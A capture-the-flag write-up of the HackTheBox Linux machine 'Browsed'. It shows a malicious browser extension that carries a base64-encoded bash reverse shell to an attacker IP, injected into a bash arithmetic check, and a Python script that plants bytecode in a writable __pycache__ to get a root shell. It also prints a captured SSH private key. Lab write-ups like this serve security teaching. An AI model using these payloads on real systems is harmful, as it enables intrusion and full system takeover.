---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - BrowserExtension
  - ChromiumHeadless
  - ClientSide
  - ArbitraryCodeExecution
  - Python
  - PycBytecodeInjection
  - SudoAbuse
---

![](images/Browsed.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Browser Extension Analysis](#Browser-Extension-Analysis)
    - [Subdomain Enumeration](#Subdomain-Enumeration)
- [Initial Access](#Initial-Access)
    - [Client-Side Code Execution through malicious Chrome Extensions](#Client-Side-Code-Execution-through-malicious-Chrome-Extensions)
- [user.txt](#usertxt)
- [Persistence](#Persistence)
- [Enumeration](#Enumeration)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [Python Bytecode Injection](#Python-Bytecode-Injection)
- [root.txt](#roottxt)

## Summary

The box starts with the `Enumeration` of a `website` on port `80/TCP` which offers the functionality to `upload` a `Browser Extension` for testing purposes. By `downloading` the sample extension and analyzing the source code, it is possible to identify a `Path Traversal Vulnerability` in the `manifest.json` file that can be exploited to read arbitrary files from the system.

By crafting a malicious `Browser Extension` that leverages the `Client-Side Artbitrary Code Execution`, `Initial Access` can be achieved. This grants access to the `user.txt`.

For the `Privilege Escalation` to `root`, the abuse of a `sudo` permission comes into play. The user `larry` is allowed to execute a `Python Script` as `root` which imports a module from a `writable __pycache__ directory`. By injecting malicious `Python Bytecode` into the cached module file using `UNCHECKED_HASH` invalidation mode, it is possible to achieve `Code Execution` as `root` and obtain the `root.txt`.

## Reconnaissance

### Port Scanning

As always we started with our initial `Port Scan` using `Nmap` which revealed port `22/TCP` and port `80/TCP` to be open.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.129.69.16 --min-rate 10000
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 20:03 +0100
Warning: 10.129.69.16 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.69.16
Host is up (0.050s latency).
Not shown: 41350 closed tcp ports (reset), 24183 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 54.13 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 22,80 10.129.69.16
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 20:05 +0100
Nmap scan report for 10.129.69.16
Host is up (1.0s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.68 seconds
```

### Enumeration of Port 80/TCP

Next we moved to the `Enumeration` of the `Website` running on port `80/TCP`.

- [http://10.129.69.16/](http://10.129.69.16/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.69.16/
http://10.129.69.16/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.69.16], JQuery, Script, Title[Browsed], nginx[1.24.0]
```

The `Website` presented itself as a platform for testing `Browser Extensions` and offered two main features. First, we could download a sample extension called `Fontify`. Second, we could upload our own `Browser Extension` for testing purposes.

![](images/2026-01-10_20-04_80_website.png)

![](images/2026-01-10_20-06_80_website_samples.png)

![](images/2026-01-10_20-07_80_website_upload.png)

After downloading the sample extension we extracted it to analyze its contents.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/extracted]
└─$ unzip fontify.zip 
Archive:  fontify.zip
  inflating: content.js              
  inflating: manifest.json           
  inflating: popup.html              
  inflating: popup.js                
  inflating: style.css
```

We proceeded to examine all the extracted files to understand how the extension worked.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/files]
└─$ ls -la
total 24
drwxrwx--- 1 root vboxsf  122 Jan 10 20:08 .
drwxrwx--- 1 root vboxsf   42 Jan 10 20:05 ..
-rwxrwx--- 1 root vboxsf  274 Mar 19  2025 content.js
-rwxrwx--- 1 root vboxsf 1930 Jan 10 20:08 fontify.zip
-rwxrwx--- 1 root vboxsf  450 Mar 23  2025 manifest.json
-rwxrwx--- 1 root vboxsf  568 Mar 19  2025 popup.html
-rwxrwx--- 1 root vboxsf  756 Mar 19  2025 popup.js
-rwxrwx--- 1 root vboxsf  181 Mar 19  2025 style.css
```

### Browser Extension Analysis

The `content.js` file showed how the extension applied fonts to websites by reading from `chrome.storage` and injecting a `style` element.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/files]
└─$ cat content.js 
// Apply saved font
chrome.storage.sync.get("selectedFont", ({ selectedFont }) => {
  if (!selectedFont) return;
  const style = document.createElement("style");
  style.innerText = `* { font-family: '${selectedFont}' !important; }`;
  document.head.appendChild(style);
});
```

The `manifest.json` was particularly interesting as it defined the extension's structure and permissions.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/files]
└─$ cat manifest.json 
{
  "manifest_version": 3,
  "name": "Font Switcher",
  "version": "2.0.0",
  "description": "Choose a font to apply to all websites!",
  "permissions": [
    "storage",
    "scripting"
  ],
  "action": {
    "default_popup": "popup.html",
    "default_title": "Choose your font"
  },
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": [
        "content.js"
      ],
      "run_at": "document_idle"
    }
  ]
}                                                                                
```

The `popup.html` defined the user interface for selecting fonts.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/files]
└─$ cat popup.html 
<!DOCTYPE html>
<html>
  <head>
    <title>Font Switcher</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <h2>Select a Font</h2>
    <select id="fontSelector">
      <option value="Comic Sans MS">Comic Sans MS</option>
      <option value="Papyrus">Papyrus</option>
      <option value="Impact">Impact</option>
      <option value="Courier New">Courier New</option>
      <option value="Times New Roman">Times New Roman</option>
      <option value="Arial">Arial</option>
    </select>
    <script src="popup.js"></script>
  </body>
</html>
```

The `popup.js` handled the font selection logic and applied the chosen font dynamically.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/files]
└─$ cat popup.js
const fontSelector = document.getElementById("fontSelector");

chrome.storage.sync.get("selectedFont", ({ selectedFont }) => {
  if (selectedFont) {
    fontSelector.value = selectedFont;
  }
});

fontSelector.addEventListener("change", () => {
  const selectedFont = fontSelector.value;
  chrome.storage.sync.set({ selectedFont }, () => {
    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: (font) => {
          const style = document.createElement("style");
          style.innerText = `* { font-family: '${font}' !important; }`;
          document.head.appendChild(style);
        },
        args: [selectedFont]
      });
    });
  });
});
```

Finally, we reviewed the `style.css` which contained basic styling for the popup interface.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/files]
└─$ cat style.css
body {
  font-family: sans-serif;
  padding: 10px;
  width: 200px;
}

h2 {
  font-size: 16px;
  margin-bottom: 10px;
}

select {
  width: 100%;
  padding: 5px;
  font-size: 14px;
}
```

After uploading the original extension to test the functionality, we noticed that the application ran the extension in a `headless Chrome browser` and returned verbose output.

The key insight came from analyzing the `manifest.json` structure. We realized that the `content_scripts` section allowed us to specify arbitrary file paths for the `js` array. 

![](images/2026-01-10_20-17_80_website_upload_output.png)

We also found a `Subdomain` in the output.

```shell
[1758:1758:0110/191701.271527:VERBOSE1:chrome_crash_reporter_client.cc(182)] GetCollectStatsConsent(): is_official_chrome_build is false so returning false
[1758:1758:0110/191701.306835:VERBOSE1:chrome_crash_reporter_client.cc(182)] GetCollectStatsConsent(): is_official_chrome_build is false so returning false
[1770:1770:0110/191701.397445:VERBOSE1:cdm_registration.cc(234)] Choosing hinted <--- CUT FOR BREVITY --->
MSM::MediaStreamManager([this=0x34040013cf00]))
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
Fontconfig error: No writable cache directories
[1758:1774:0110/191702.460384:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.config/google-chrome-for-testing/Consent To Send Stats": No such file or directory (2)
[1758:1758:0110/191702.469688:VERBOSE1:key_storage_util_linux.cc(46)] Password storage detected desktop environment: (unknown)
[1758:1758:0110/191702.469710:VERBOSE1:key_storage_linux.cc(116)] Selected backend for OSCrypt: BASIC_TEXT
[1758:1758:0110/191702.469722:VERBOSE1:key_storage_linux.cc(135)] OSCrypt did not initialize a backend.
[1758:1778:0110/191702.469921:ERROR:bus.cc(408)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
[1758:1758:0110/191702.472204:VERBOSE1:chrome_browser_cloud_management_controller.cc(161)] Cloud management controller initialization aborted as CBCM is not enabled. Please use the `--enable-chrome-browser-cloud-management` command line flag to enable it if you are not using the official Google Chrome build.
[1758:1774:0110/191702.523600:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.config/google-chrome-for-testing/Default/Web Applications/Logs/WebAppInstallManager.log": No such file or directory (2)
[1758:1778:0110/191702.523880:ERROR:bus.cc(408)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
<--- CUT FOR BREVITY --->
http://clients2.google.com/time/1/current?cup2key=8:saYc5JzmxgH_TgbAceTqwlykIHe5IXsVtUR-jI8sFOo&cup2hreq=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
[1793:1798:0110/191702.872676:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://browsedinternals.htb/
[1793:1798:0110/191702.872996:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://localhost/
[1793:1798:0110/191702.873159:VERBOSE1:network_delegate.cc(37)]
<--- CUT FOR BREVITY --->
```

```shell
http://browsedinternals.htb/
```

### Subdomain Enumeration

On the `Subdomain` we found an instance of `Gitea` which on a closer look allowed us to explore public content.

- [http://browsedinternals.htb/](http://browsedinternals.htb/)

![](images/2026-01-10_20-20_80_gitea.png)

This revealed  a `username` called `larry`.

![](images/2026-01-10_20-21_80_gitea_explore.png)

| Username |
| -------- |
| larry    |

Next we started investigating all the available files in the repository.

![](images/2026-01-10_20-24_80_gitea_repository.png)

First we downloaded the `tarballs` to see if we could find any useful information. However the archives were empty.

![](images/2026-01-10_20-24_80_gitea_backups.png)

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/extracted]
└─$ tar -xvf data_backup_20250317_121551.tar.gz 
home/larry/markdownPreview/data/
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/extracted]
└─$ tar -xvf data_backup_20250317_123946.tar.gz 
home/larry/markdownPreview/data/
```

We also took a closer look at the `Bash Script` available on the repository.

```shell
#!/bin/bash

ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"

log_action() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
}

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."

elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
  log_action "Routine 1: Data backed up to $BACKUP_DIR."
  echo "Backup completed."

elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;
  log_action "Routine 2: Log files compressed."
  echo "Logs rotated."

elif [[ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
  uname -a > "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  log_action "Routine 3: System info dumped."
  echo "System info saved."

else
  log_action "Unknown routine ID: $1"
  echo "Routine ID not implemented."
fi
```

![](images/2026-01-10_20-30_80_gitea_repository_routines.png)

A potential vulnerability could be the `Arithmetic Evaluation` through the `if/else` statement.

```shell
<--- CUT FOR BREVITY --->
if [[ "$1" -eq 0 ]]; then
<--- CUT FOR BREVITY --->
```

And we also checked the application itself to see how it would handle uploaded files.

```shell
from flask import Flask, request, send_from_directory, redirect
from werkzeug.utils import secure_filename

import markdown
import os, subprocess
import uuid

app = Flask(__name__)
FILES_DIR = "files"

# Ensure the files/ directory exists
os.makedirs(FILES_DIR, exist_ok=True)

@app.route('/')
def index():
    return '''
    <h1>Markdown Previewer</h1>
    <form action="/submit" method="POST">
        <textarea name="content" rows="10" cols="80"></textarea><br>
        <input type="submit" value="Render & Save">
    </form>
    <p><a href="/files">View saved HTML files</a></p>
    '''


@app.route('/submit', methods=['POST'])
def submit():
    content = request.form.get('content', '')
    if not content.strip():
        return 'Empty content. <a href="/">Go back</a>'

    # Convert markdown to HTML
    html = markdown.markdown(content)

    # Save HTML to unique file
    filename = f"{uuid.uuid4().hex}.html"
    filepath = os.path.join(FILES_DIR, filename)
    with open(filepath, 'w') as f:
        f.write(html)

    return f'''
    <p>File saved as <code>{filename}</code>.</p>
    <p><a href="/view/{filename}">View Rendered HTML</a></p>
    <p><a href="/">Go back</a></p>
    '''

@app.route('/files')
def list_files():
    files = [f for f in os.listdir(FILES_DIR) if f.endswith('.html')]
    links = '\n'.join([f'<li><a href="/view/{f}">{f}</a></li>' for f in files])
    return f'''
    <h1>Saved HTML Files</h1>
    <ul>{links}</ul>
    <p><a href="/">Back to editor</a></p>
    '''

@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"

@app.route('/view/<filename>')
def view_file(filename):
    filename = secure_filename(filename)
    if not filename.endswith('.html'):
        return "Invalid filename", 400
    return send_from_directory(FILES_DIR, filename)

# The webapp should only be accessible through localhost
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

![](images/2026-01-10_20-35_80_gitea_repository_app.png)

The source code revealed that we could technically call the endpoint `/routines.sh`. That gave us the idea to leverage this chain to achieve code execution.

```python
<--- CUT FOR BREVITY --->
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
<--- CUT FOR BREVITY --->
```

The last interesting thing was an `.html` file that contained a weird payload. There was some research on that but we assumed that it was kind of a rabbit hole.

![](images/2026-01-10_20-37_80_gitea_repository_files.png)

```shell
<p>a
zz</p>
```

![](images/2026-01-10_20-39_80_gitea_repository_files_html_file.png)

## Initial Access

### Client-Side Code Execution through malicious Chrome Extensions

After uploading the original extension to test the functionality, we noticed that the application ran the extension in a `Headless Chrome Browser` and returned verbose output.

The key insight came from analyzing the `manifest.json` structure. We realized that the `content_scripts` section allowed us to specify arbitrary file paths for the `js` array.

On our first attempt we tried to get a callback to confirm our assumption.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/plugin]
└─$ cat content.js 
fetch('http://127.0.0.1:5000/routines/0')
  .then(response => response.text())
  .then(data => {
    // Send confirmation back to your server
    fetch('http://10.10.16.21/?result=success');
  })
  .catch(err => {
    fetch('http://10.10.16.21/?error=' + err.message);
  });
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/plugin]
└─$ cat manifest.json 
{
  "manifest_version": 3,
  "name": "Font Switcher",
  "version": "2.0.0",
  "description": "Choose a font to apply to all websites!",
  "permissions": [
    "storage",
    "scripting"
  ],
  "host_permissions": [
    "http://127.0.0.1/*",
    "http://localhost/*"
  ],
  "action": {
    "default_popup": "popup.html",
    "default_title": "Choose your font"
  },
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": [
        "content.js"
      ],
      "run_at": "document_idle"
    }
 }
```

We `zipped` the `Files` and made sure that it contained all relevant files as in the example we downloaded previously.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/plugin]
└─$ zip -r malicious.zip content.js manifest.json popup.html popup.js style.css
  adding: content.js (deflated 36%)
  adding: manifest.json (deflated 48%)
  adding: popup.html (deflated 55%)
  adding: popup.js (deflated 52%)
  adding: style.css (deflated 34%)
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/plugin]
└─$ unzip -l malicious.zip 
Archive:  malicious.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      275  2026-01-10 20:56   content.js
      531  2026-01-10 20:56   manifest.json
      568  2026-01-10 20:52   popup.html
      756  2026-01-10 20:52   popup.js
      181  2026-01-10 20:52   style.css
---------                     -------
     2311                     5 files
```

Then we uploaded it and nearly right away, got a hit on our web server.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.69.16 - - [10/Jan/2026 20:57:15] "GET /?error=Failed%20to%20fetch HTTP/1.1" 200 -
```

Next we experimented a bit back and forth until we came up with the idea of `Base64 Encoding` to get `Arbitrary Code Execution` directly on the system.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/plugin]
└─$ cat background.js 
const LHOST = "10.10.16.21";
const LPORT = "9001";

function b64(s) {
  return btoa(unescape(encodeURIComponent(s)));
}

const cmd = `bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'`;
const payload = `arr[$(echo ${b64(cmd)} | base64 -d | bash)]`;
const url =
  "http://127.0.0.1:5000/routines/" + encodeURIComponent(payload);

chrome.runtime.onInstalled.addListener(() => {
  fetch(url);
});

chrome.runtime.onStartup.addListener(() => {
  fetch(url);
});
```

Then we repeated the steps to create the malicious archive and after we uploaded it, we received the `Callback` as `larry`.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/plugin]
└─$ cat manifest.json 
{
  "name": "foobar",
  "version": "1.0",
  "manifest_version": 3,
  "background": {
    "service_worker": "background.js"
  },
  "host_permissions": [
    "http://127.0.0.1:5000/*"
}
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Browsed/files/plugin]
└─$ zip -r malicious.zip background.js manifest.json  
  adding: background.js (deflated 37%)
  adding: manifest.json (deflated 28%)
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/serve]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.21] from (UNKNOWN) [10.129.69.16] 60174
bash: cannot set terminal process group (1445): Inappropriate ioctl for device
bash: no job control in this shell
larry@browsed:~/markdownPreview$ 
```

## user.txt

```shell
larry@browsed:~$ cat user.txt
cat user.txt
bceccbe53169b772e28f4b682b7d2f12
```

## Persistence

To have a smoother console experience, we grabbed the `SSH Key` within `/home/larry/.ssh`, set the required permissions and logged in via native SSH.

```shell
larry@browsed:~/.ssh$ cat id_ed25519
cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
hwAAAAtzc2gtZWQyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrw
AAAEBRIok98/uzbzLs/MWsrygG9zTsVa9GePjT52KjU6LoJdlkhk8FEXwXNCOe06dt3BiJ
Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/files]
└─$ cat larry_id_ed25519 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
hwAAAAtzc2gtZWQyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrw
AAAEBRIok98/uzbzLs/MWsrygG9zTsVa9GePjT52KjU6LoJdlkhk8FEXwXNCOe06dt3BiJ
Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/files]
└─$ chmod 600 larry_id_ed25519
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Browsed/files]
└─$ ssh -i larry_id_ed25519 larry@10.129.69.16
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jan 10 10:01:50 PM UTC 2026

  System load:  0.0               Processes:             214
  Usage of /:   64.0% of 7.11GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.129.69.16
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Last login: Sat Jan 10 22:01:52 2026 from 10.10.16.21
larry@browsed:~$
```

## Enumeration

As the typical first thing to do we started with the `Enumeration`. We found no special group memberships nor another useful or necessary user on the system to escalate privileges too.

```shell
larry@browsed:~$ id
id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```

```shell
larry@browsed:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
larry:x:1000:1000:larry:/home/larry:/bin/bash
git:x:110:110:Git Version Control,,,:/home/git:/bin/bash
mysql:x:111:111:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:988::/var/log/laurel:/bin/false
```

However, the user `larry` was allowed to execute `/opt/extensiontool/extension_tool.py` using `sudo`.

```shell
larry@browsed:~$ sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

The script itself didn't looked vulnerable but on a closer look at the `Permissions` on the `Filesystem` we noticed that `__pycache__` was `world-writeable`!

```shell
larry@browsed:~$ cat /opt/extensiontool/extension_tool.py
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def bump_version(data, path, level='patch'):
    version = data["version"]
    major, minor, patch = map(int, version.split('.'))
    if level == 'major':
        major += 1
        minor = patch = 0
    elif level == 'minor':
        minor += 1
        patch = 0
    else:
        patch += 1

    new_version = f"{major}.{minor}.{patch}"
    data["version"] = new_version

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Version bumped to {new_version}")
    return new_version

def package_extension(source_dir, output_file):
    temp_dir = '/opt/extensiontool/temp'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    output_file = os.path.basename(output_file)
    with zipfile.ZipFile(os.path.join(temp_dir,output_file), 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_dir):
            for filename in filenames:
                filepath = os.path.join(foldername, filename)
                arcname = os.path.relpath(filepath, source_dir)
                zipf.write(filepath, arcname)
    print(f"[+] Extension packaged as {temp_dir}/{output_file}")

def main():
    parser = ArgumentParser(description="Validate, bump version, and package a browser extension.")
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'], help='Version bump type')
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip', help='Output zip file name')
    parser.add_argument('--clean', action='store_true', help="Clean up temporary files after packaging")
    
    args = parser.parse_args()

    if args.clean:
        clean_temp_files(args.clean)

    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)
    
    extension_path = os.path.join(EXTENSION_DIR, args.ext)
    manifest_path = os.path.join(extension_path, 'manifest.json')

    manifest_data = validate_manifest(manifest_path)
    
    # Possibly bump version
    if (args.bump):
        bump_version(manifest_data, manifest_path, args.bump)
    else:
        print('[-] Skipping version bumping')

    # Package the extension
    if (args.zip):
        package_extension(extension_path, args.zip)
    else:
        print('[-] Skipping packaging')


if __name__ == '__main__':
    main()
```

```shell
larry@browsed:/opt/extensiontool$ ls -la
total 24
drwxr-xr-x 4 root root 4096 Dec 11 07:54 .
drwxr-xr-x 4 root root 4096 Aug 17 12:55 ..
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Dec 11 07:57 __pycache__
```

```shell
drwxrwxrwx 2 root root 4096 Dec 11 07:57 __pycache__
```

## Privilege Escalation to root

### Python Bytecode Injection

For the `Privilege Escalation` we leveraged a technique involving `Python Bytecode Injection` into the cached module file. The vulnerability existed because the `__pycache__` directory was `world-writable`, allowing us to replace the compiled `.pyc` file.

We used a reference from `matmul.net` which explained how to compile `Python Bytecode` with `UNCHECKED_HASH` invalidation mode, bypassing the integrity checks that `Python` normally performs.

- [https://matmul.net/$/pyc.html](https://matmul.net/$/pyc.html)

The whole exploitation process got forged together in a small script that automated the process of the `Python Bytecode Injection`.

```shell
larry@browsed:/tmp/privesc$ cat privesc.py 
import os
import py_compile
import shutil
import time
from py_compile import PycInvalidationMode

TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"
TMP_SRC = "/tmp/extension_utils.py"
TMP_PYC = "/tmp/extension_utils.cpython-312.pyc"

payload = 'import os; os.execl("/bin/bash", "bash", "-p")'

with open(TMP_SRC, "w") as f:
    f.write(payload)

# compile as unchecked-hash pyc
py_compile.compile(
    TMP_SRC,
    cfile=TMP_PYC,
    invalidation_mode=PycInvalidationMode.UNCHECKED_HASH
)

# replace the target bytecode
if os.path.exists(TARGET_PYC):
    os.remove(TARGET_PYC)

shutil.copy(TMP_PYC, TARGET_PYC)

# ensure pyc is preferred over source
future = time.time() + 120
os.utime(TARGET_PYC, (future, future))

print("[+] Bytecode injected")
print("[+] Run: sudo /opt/extensiontool/extension_tool.py --ext Fontify")
```

